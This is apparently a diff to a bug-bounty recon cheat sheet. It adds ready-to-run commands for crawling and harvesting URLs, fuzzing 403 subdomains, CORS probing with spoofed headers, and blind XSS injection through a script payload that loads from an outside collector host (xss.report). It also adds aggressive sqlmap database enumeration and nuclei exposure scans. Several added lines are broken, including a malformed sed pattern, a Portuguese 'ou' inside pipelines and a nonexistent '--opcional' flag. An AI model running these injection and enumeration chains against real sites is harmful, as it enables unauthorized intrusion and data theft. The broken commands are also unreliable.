@@ -38,6 +38,16 @@ Visit All Non-WAF Subdomains Manually🧱️
 -------------------------------------
 cat nowaf_subs_domain.com.txt | grep 403 | awk '{print $1}'
 
+Search links
+--------------------------------------
+katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive, commoncrawl, alienvault -hf -jc -fx -ef woff, css, png, svg, jpg, woff2, jpeg, gif, svg -o allurls.txt
+
+cat alive.txt | gau --threads 100 > gau.txt
+cat alive.txt | hakrawler -t 100 > hakrawler.txt --opcional
+
+cat gau.txt | grep "=" | anew ou sort -u > parametros.txt
+cat parametros.txt | sed 's/=.**/=/' | anew ou sort -u > parametros_limpo.txt (remove op conteudo apos o =)
+
 Prepare the List of 403 Subdomains for Fuzzing🎲️
 ----------------------------------------------
 cat nowaf_subs_domain.com.txt | grep 403 | awk '{print $1}' > 403_subs_domain.com.txt
@@ -47,6 +57,10 @@ dirsearch -u https://sub.domain.com -x 403,404,500,400,502,503,429 --random-agen
 
 Extension based Fuzzing
 dirsearch -u https://sub.domain.com -e xml,json,sql,db,log,yml,yaml,bak,txt,tar.gz,zip -x 403,404,500,400,502,503,429 --random-agent
+
+CORSY
+------------
+python corsy.py -i /home/coffinxp/waitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
 
 OR
 ------------
@@ -60,21 +74,16 @@ XSS
 -------------
 https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide
 
-
-
+katana -ps -f qurl | gf xss | bxss -appendMode -payload "<script src=https://xss.report/c/coffinxp></script>"
 
 SQLi
 -------------
+cat allurls.txt | gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 3 --level 5 --random-agent | tee -a sqli.txt
 
-
-🧠️Next step
 JavaScript analysis 🔎️
-
-
-
-Google Dorking 🔮
-
-GitHub Recon 💻
+--------------------------
+cat allurls.txt | grep -E "\.js$" >> js.txt
+cat js.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30
 
 -------------------------------------------------------------------
 
